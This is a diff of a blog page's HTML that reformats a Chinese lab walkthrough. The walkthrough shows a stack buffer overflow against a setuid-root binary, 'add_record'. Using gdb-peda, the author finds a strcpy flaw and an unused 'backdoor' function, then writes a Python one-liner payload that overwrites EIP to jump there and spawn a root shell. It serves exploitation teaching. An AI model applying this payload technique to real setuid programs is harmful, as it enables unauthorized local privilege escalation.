+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ break * 0x0804877b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124163823804.png" alt="image-20211124163823804"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124164219850.png" alt="image-20211124164219850"></p>
@@ -333,17 +333,17 @@
 <p>在0x08048834位置调用了vuln 首先这不是一个熟知的函数 其次函数名后没有@plt标识 又顾名思义难免联想到脆弱点等 猜测这是软件开发者自己写的函数</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124165344555.png" alt="image-20211124165344555"></p>
 <p>查看当前程序中内嵌的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info func</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ info func<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124170306580.png" alt="image-20211124170306580"></p>
 <p>发现setuid函数，结合之前ls -l查看add_record文件的权限和所属者是root的信息，猜测使用这个函数调用系统权限  看到的system函数是否可以执行操作系统指令呢？ backdoor “后门”？存在一系列疑问，也渐渐有了方向</p>
 <p>分别查看这个几个函数在程序中有什么动作？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas vuln</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ disas vuln<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124170831901.png" alt="image-20211124170831901"></p>
 <p>对strcpy函数进行搜索，该函数曾存在缓冲区溢出漏洞</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124171130950.png" alt="image-20211124171130950"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas backdoor</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ disas backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124171814589.png" alt="image-20211124171814589"></p>
 <p>调用了setuid函数提权，调用了system函数执行指令，</p>
@@ -351,40 +351,40 @@
 <p>思路：</p>
 <p>主程序会调用执行vuln函数–&gt;vuln函数又调用了存在缓冲区溢出漏洞的内嵌函数strcpy–&gt;但主程序内并未调用backdoor函数–&gt;所以利用主程序内加载的vuln函数中的strcpy函数的缓冲区溢出漏洞–&gt;向EIP寄存器内写入backdoor的起始内存加载地址–&gt;以执行backdoor函数–&gt;执行setuid函数、执行system函数–&gt;执行system函数中的操作系统指令–&gt;有没有可能注入payload–&gt;完成本地提权？</p>
 <p>向EIP寄存器内写入backdoor的起始内存加载地址（定向到payload内）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct; print(&#x27;zz\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python -c &quot;import struct; print(&#39;zz\n1\n1\n1\n&#39; + &#39;A&#39;*62 + struct.pack(&#39;I&#39;, 0x08048676))&quot; &gt; payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124174848606.png" alt="image-20211124174848606"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q     #退出调试器</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ q     #退出调试器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>回到目标靶机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">。r b r</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">。r b r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124175728595.png" alt="image-20211124175728595"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record    #重新打开gdb调试</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb -q .&#x2F;add_record    #重新打开gdb调试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; payload</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ r &lt; payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124175923850.png" alt="image-20211124175923850"></p>
 <p>结果耐人寻味：产生了两个新的进程，4312执行了程序&#x2F;bin&#x2F;dash ，4313执行了程序&#x2F;bin&#x2F;bash</p>
 <p>为什么产生这样的结果?去分析一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q     #退出调试器</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ q     #退出调试器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record    #重新打开gdb调试</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb -q .&#x2F;add_record    #重新打开gdb调试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ disas main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>尝试在调用vuln前增加断点单步分析</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break vuln</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ break vuln<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r &lt; payload</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ r &lt; payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124181204165.png" alt="image-20211124181204165"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s       #进行单步执行         </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb-peda$ s       #进行单步执行         <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在进行多次单步执行调试后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat payload - | .&#x2F;add_record<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211124192251868.png" alt="image-20211124192251868"></p>
 </div></article></div></main><footer><div class="paginator"><a href="/2022/01/14/week6/" class="prev">PREV</a><a href="/2022/01/05/week4/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
